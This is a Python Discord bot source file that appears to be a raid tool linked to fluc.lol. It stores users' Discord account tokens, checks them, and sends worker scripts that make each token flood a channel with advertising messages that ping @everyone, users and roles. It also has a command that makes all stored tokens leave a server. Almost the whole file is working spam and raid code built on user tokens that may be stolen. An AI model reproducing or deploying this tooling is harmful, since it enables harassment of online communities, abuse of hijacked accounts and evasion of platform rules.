import discord
import shared
import asyncio
import aiohttp
from itertools import cycle
from shared import get_embed
from discord import app_commands
from discord.ext import commands
from components import SpamView
from logging import getLogger

bot = commands.Bot('.', intents=discord.Intents.all(), help_command=None)
session: aiohttp.ClientSession
log = getLogger(__name__)
db = shared.db
state = {}
main_server: discord.Guild

@bot.event
async def on_ready():
    assert bot.user
    global session
    global main_server
    session = bot.http._HTTPClient__session # type: ignore
    bot.add_view(SpamView(None))
    await bot.tree.sync()
    while not getattr(shared, 'main_server', None):
        await asyncio.sleep(0.1)
    main_server = shared.main_server 
    log.info(f'Logged on {bot.user} (ID: {bot.user.id})')

@bot.tree.command(name='spam', description='Floods current channel using interaction token method.')
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def cmd_spam(interaction: discord.Interaction):
    user = await db.get_user(interaction.user.id)
    if not user:
        if main_server.get_member(interaction.user.id):
            embed = get_embed('To use this bot you have to log in with Discord on [fluc.lol](https://fluc.lol/account/login)', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        return
    log.debug(f'Command spam ran by {interaction.user.id}')
    view = SpamView(user.settings, interaction)
    await interaction.response.send_message(view=view, embed=view.embed, ephemeral=True)

@bot.tree.command(name='token_spam', description='Floods current channel using user tokens.')
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def cmd_token_spam(interaction: discord.Interaction, amount: app_commands.Range[int, 1, 10] = 10):
    if not amount:
        amount = 10
    user = await db.get_user(interaction.user.id)
    if not user:
        if main_server.get_member(interaction.user.id):
            embed = get_embed('To use this bot you have to log in with Discord on [fluc.lol](https://fluc.lol/account/login)', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        return
    tokens = await db.get_tokens(interaction.user.id)
    if not len(tokens):
        embed = get_embed('No tokens found. Use /add_token [token] to load tokens.', 'warning')
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    print('loaded: ', tokens)
    headers = {
        'content-type': 'application/json'
    }
    for token in tokens[:]:
        headers['authorization'] = token
        async with session.get('https://discord.com/api/users/@me', headers=headers) as response:
            if not response.ok:
                print('got:', response)
                tokens.remove(token)
                await db.delete_token(interaction.user.id, token)
                continue
        async with session.get(f'https://discord.com/api/channels/{interaction.channel_id}', headers=headers) as response:
            if not response.ok:
                print('not get channel:', token)
                tokens.remove(token)
    embed = get_embed(f'{len(tokens)} token(s) were loaded. The process will begin shortly..')
    await interaction.response.send_message(embed=embed, ephemeral=True)
    workers = shared.config['workers']
    batches = []
    for i in range(len(workers)):
        batches.append(tokens[i::len(workers)])
            
    for batch, worker in zip(batches, cycle(workers)):
        code = f"""
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

TOKENS = {batch}
CHANNEL_ID = {interaction.channel_id}
""" + """
payload = {
    'content': '/fluc runs yo silly server join for fastest r-bot',
    'allowed_mentions': {
        'parse': [
            'everyone',
            'users',
            'roles'
        ]
    }
}

def send(token: str):
    headers = {
        'authorization': token,
        'content-type': 'application/json'
    }
    for i in range(50):
        response = requests.post(f'https://discord.com/api/channels/{CHANNEL_ID}/messages', json=payload, headers=headers)
        # Forbidden
        if response.status_code == 403:
            break
        if i > 2:
            time.sleep(0.5)

with ThreadPoolExecutor() as executor:
    futures = []
    for token in TOKENS:
        for _ in range(3):
            futures.append(executor.submit(send, token))

    for future in as_completed(futures):
        future.result()
"""
        asyncio.create_task(shared.submit_worker(worker, code))
        # Small delay - smoother
        await asyncio.sleep(0.2)

@bot.tree.command(name='add_token')
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def add_token(interaction: discord.Interaction, token: str):
    user = await db.get_user(interaction.user.id)
    if not user:
        if main_server.get_member(interaction.user.id):
            embed = get_embed('To use this bot you have to log in with Discord on [fluc.lol](https://fluc.lol/account/login)', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        return
    headers = {
        'authorization': token,
        'content-type': 'application/json'
    }
    async with session.get('https://discord.com/api/users/@me', headers=headers) as response:
        if not response.ok:
            embed = get_embed('This token is not valid.', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
    if await db.add_token(interaction.user.id, token):
        embed = get_embed('The token was added to database.')
    else:
        embed = get_embed('The token was not added to database.', 'warning')
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name='remove_token')
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def remove_token(interaction: discord.Interaction, token: str):
    user = await db.get_user(interaction.user.id)
    if not user:
        if main_server.get_member(interaction.user.id):
            embed = get_embed('To use this bot you have to log in with Discord on [fluc.lol](https://fluc.lol/account/login)', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        return
    if await db.delete_token(interaction.user.id, token):
        embed = get_embed('This token was removed from database.')
    else:
        embed = get_embed('Could not remove token from database.', 'warning')
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name='leave_tokens')
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def leave_tokens(interaction: discord.Interaction, token: str):
    user = await db.get_user(interaction.user.id)
    if not user:
        if main_server.get_member(interaction.user.id):
            embed = get_embed('To use this bot you have to log in with Discord on [fluc.lol](https://fluc.lol/account/login)', 'warning')
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await interaction.response.defer(ephemeral=True)
        return
    tokens = await db.get_tokens(user.id)
    for token in tokens:
        asyncio.create_task(session.delete(
            f'https://discord.com/api/v9/users/@me/guilds/{interaction.guild.id}', # type: ignore
            json={
                'lurking': False
            },
            headers={
                'authorization': token,
                'content-type': 'application/json'
            }
        ))
    embed = get_embed('Done.')
    await interaction.response.send_message(embed=embed, ephemeral=True)